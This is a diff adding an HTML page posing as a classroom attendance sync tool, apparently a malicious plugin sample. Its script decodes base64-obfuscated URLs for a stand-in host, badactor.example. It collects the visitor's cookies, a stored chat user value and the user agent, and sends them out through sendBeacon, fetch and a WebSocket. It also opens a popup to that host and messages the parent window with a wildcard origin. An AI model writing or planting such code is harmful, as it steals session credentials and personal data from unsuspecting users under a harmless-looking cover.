@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Attendance Shadow Sync</title>
+  </head>
+  <body>
+    <main>
+      <h1>Attendance Shadow Sync</h1>
+      <p>Preparing classroom roster intelligence...</p>
+    </main>
+
+    <script>
+      const encodedCollector = 'aHR0cHM6Ly9jb2xsZWN0b3IuYmFkYWN0b3IuZXhhbXBsZS9pbmdlc3Q=';
+      const encodedSocket = 'd3NzOi8vc2hhZG93LXN5bmMuYmFkYWN0b3IuZXhhbXBsZS9zb2NrZXQ=';
+
+      const collectorUrl = atob(encodedCollector);
+      const socketUrl = atob(encodedSocket);
+
+      const snapshot = {
+        local: localStorage.getItem('chatbox:last-user') || 'none',
+        cookies: document.cookie || 'none',
+        ua: navigator.userAgent,
+        ts: Date.now(),
+      };
+
+      indexedDB.open('shadow-sync-cache');
+      navigator.sendBeacon?.(collectorUrl, JSON.stringify(snapshot));
+      fetch(collectorUrl, {
+        method: 'POST',
+        mode: 'cors',
+        body: JSON.stringify(snapshot),
+      }).catch(() => {});
+
+      const ws = new WebSocket(socketUrl);
+      ws.addEventListener('open', () => ws.send(JSON.stringify({ kind: 'hello', snapshot })));
+
+      const runner = new Function('payload', 'return payload.ua.toUpperCase()');
+      runner(snapshot);
+
+      window.open('https://collector.badactor.example/debug', '_blank');
+
+      window.parent.postMessage({ type: 'PLUGIN_READY', nonce: '' }, '*');
+    </script>
+  </body>
+</html>
